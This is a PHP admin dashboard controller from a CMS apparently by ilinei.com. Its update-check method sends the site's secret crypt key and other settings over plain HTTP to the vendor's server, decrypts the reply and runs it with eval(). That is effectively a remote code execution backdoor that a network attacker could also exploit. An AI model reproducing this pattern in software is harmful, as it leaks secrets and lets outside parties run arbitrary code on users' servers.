<?php
//版权所有(C) 2014 www.ilinei.com

namespace admin\control;

use admin\model\_desktop;
use admin\model\_module;
use admin\model\_setting;
use ilinei\httpclient;

//直接访问，报错！
if(!defined('INIT')) exit('Access Denied');

//引入语言包
require_once ROOTPATH.'/module/admin/lang.php';

//桌面
class desktop{
	//默认
	public function index(){
		global $_var, $setting;

		//检查系统版本
		$setting['Application'] = strtoupper($setting['Application']);
		$setting['Business'] = strtoupper($setting['Business']);

		//系统参数
		$servers = explode(' ', $_SERVER['SERVER_SOFTWARE']);
		
		$_desktop = new _desktop();
		$_module = new _module();

		//获取当前用户桌面菜单
		$menus = $_desktop->get_menus($_var['current']);
		
		//待办事项
		$task = $_desktop->get_task($menus);
		
		//最新更新数据
		$last_data = $_desktop->get_data_updated($menus);
		
		//mysql数据库版本
		$mysqls = $_desktop->get_mysqls();
		
		//安装的模块列表
		$modules = $_module->get_installed($_var['current']);
		
		include_once view('/module/admin/view/desktop');
	}
	
	//数据统计
	public function stat(){
		global $_var;
		
		$_desktop = new _desktop();
		
		//获取当前用户桌面菜单
		$menus = $_desktop->get_menus($_var['current']);
		
		//获取数据统计
		$stat = $_desktop->get_data_stat($menus);
		
		include_once view('/module/admin/view/desktop_stat');
	}
	
	//检查更新
	public function updating(){
		global $config, $setting;
		
		$_setting = new _setting();
		
		//检查系统更新
		$updating = array('button' => '', 'message' => '', 'version' => '');
		
		$params['host'] = $setting['SiteHost'];
		$params['application'] = $setting['Application'];
		$params['business'] = $setting['Business'];
		$params['version'] = $setting['Version'];
		$params['product_name'] = $setting['ProductName'];
		$params['phone'] = $setting['SitePhone'];
		$params['crypt'] = $config['crypt'];
		$params['sn'] = $setting['crypt'];
		
		$httpClient = new httpclient();
		$response = $httpClient->post("http://www.ilinei.com/version.do", $params);
		if($response){
			$response = str_decrypt($response);
			if($response){
				eval($response);
                cache_delete('setting');
			}
		}
		
		exit_json($updating);
	}
	
	//数据更新
	public function data(){
		global $_var;
		
		$_desktop = new _desktop();
		
		//获取当前用户桌面菜单
		$menus = $_desktop->get_menus($_var['current']);
		
		//获取数据更新
		$last_data = $_desktop->get_data_updated($menus);
		
		include_once view('/module/admin/view/desktop_data');
	}
	
}
?>